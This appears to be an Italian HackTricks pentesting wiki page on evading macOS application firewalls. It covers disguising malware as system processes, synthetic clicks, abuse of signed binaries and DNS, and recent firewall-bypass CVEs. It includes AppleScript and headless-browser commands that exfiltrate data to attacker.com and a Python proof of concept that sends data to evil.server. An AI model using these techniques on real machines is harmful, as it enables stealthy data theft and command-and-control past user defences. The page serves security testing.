# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Tecniche trovate

Le seguenti tecniche sono state trovate funzionanti in alcune app firewall di macOS.

### Abuso dei nomi nella whitelist

- Ad esempio, chiamare il malware con nomi di processi macOS ben noti come **`launchd`**

### Click sintetico

- Se il firewall chiede il permesso all'utente, far **cliccare su consenti** al malware

### **Utilizzare binari firmati da Apple**

- Come **`curl`**, ma anche altri come **`whois`**

### Domini Apple ben noti

Il firewall potrebbe consentire connessioni a domini Apple ben noti come **`apple.com`** o **`icloud.com`**. E iCloud potrebbe essere utilizzato come C2.

### Bypass generico

Alcune idee per provare a bypassare i firewall

### Controlla il traffico consentito

Conoscere il traffico consentito ti aiuterà a identificare i domini potenzialmente in whitelist o quali applicazioni sono autorizzate ad accedervi.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Le risoluzioni DNS vengono eseguite tramite l'applicazione firmata **`mdnsreponder`** che probabilmente sarà autorizzata a contattare i server DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Via Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Iniezioni di processi

Se puoi **iniettare codice in un processo** che è autorizzato a connettersi a qualsiasi server, potresti bypassare le protezioni del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilità recenti di bypass del firewall di macOS (2023-2025)

### Bypass del filtro dei contenuti web (Screen Time) – **CVE-2024-44206**
Nel luglio 2024 Apple ha corretto un bug critico in Safari/WebKit che ha compromesso il “filtro dei contenuti web” a livello di sistema utilizzato dai controlli parentali di Screen Time.
Un URI appositamente creato (ad esempio, con “://” codificato due volte) non è riconosciuto dall'ACL di Screen Time ma è accettato da WebKit, quindi la richiesta viene inviata senza filtri. Qualsiasi processo che può aprire un URL (incluso codice sandboxed o non firmato) può quindi raggiungere domini che sono esplicitamente bloccati dall'utente o da un profilo MDM.

Test pratico (sistema non patchato):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Bug di ordinamento delle regole del filtro pacchetti (PF) nelle prime versioni di macOS 14 “Sonoma”
Durante il ciclo beta di macOS 14, Apple ha introdotto una regressione nel wrapper utente attorno a **`pfctl`**. 
Le regole che sono state aggiunte con la parola chiave `quick` (utilizzata da molti kill-switch VPN) sono state ignorate silenziosamente, causando perdite di traffico anche quando un'interfaccia VPN/firewall riportava *bloccato*. Il bug è stato confermato da diversi fornitori di VPN ed è stato corretto nella RC 2 (build 23A344).

Controllo rapido delle perdite:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusare dei servizi helper firmati da Apple (legacy – pre-macOS 11.2)
Prima di macOS 11.2, la **`ContentFilterExclusionList`** consentiva a ~50 binari Apple come **`nsurlsessiond`** e l'App Store di bypassare tutti i firewall a filtro socket implementati con il framework Network Extension (LuLu, Little Snitch, ecc.).
Il malware poteva semplicemente avviare un processo escluso—o iniettare codice in esso—e tunnelare il proprio traffico attraverso il socket già consentito. Apple ha completamente rimosso l'elenco di esclusione in macOS 11.2, ma la tecnica è ancora rilevante su sistemi che non possono essere aggiornati.

Esempio di proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Suggerimenti sugli strumenti per macOS moderno

1. Ispeziona le attuali regole PF generate dai firewall GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumera i binari che già possiedono il diritto *outgoing-network* (utile per piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra programmaticamente il tuo filtro di contenuto Network Extension in Objective-C/Swift.
Un PoC minimale senza root che inoltra pacchetti a un socket locale è disponibile nel codice sorgente di **LuLu** di Patrick Wardle.

## Riferimenti

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
